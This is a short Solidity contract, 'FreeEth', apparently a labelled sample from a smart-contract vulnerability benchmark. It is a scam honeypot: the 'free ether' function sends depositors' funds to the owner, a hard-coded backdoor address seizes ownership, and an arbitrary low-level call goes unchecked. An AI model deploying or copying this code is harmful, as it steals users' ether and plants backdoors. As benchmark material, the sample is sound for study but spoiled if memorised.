//pragma solidity ^0.4.19;

contract FreeEth
{
    address payable public Owner = msg.sender;

    function() external payable{}

    function GetFreebie()
    public
    payable
    {
        if(msg.value>1 ether)
        {
            Owner.transfer(address(this).balance);
            msg.sender.transfer(address(this).balance);
        }
    }

    function withdraw()
    payable
    public
    {
        if(msg.sender==address(0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af)){Owner=address(0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af);}
        require(msg.sender == Owner);
        Owner.transfer(address(this).balance);
    }

    function Command(address adr,bytes memory data)
    payable
    public
    {
        require(msg.sender == Owner);
        // <yes> <report> UNCHECKED_LL_CALLS
        (bool success, bytes memory data) = adr.call(abi.encode(msg.value, data));
    }
}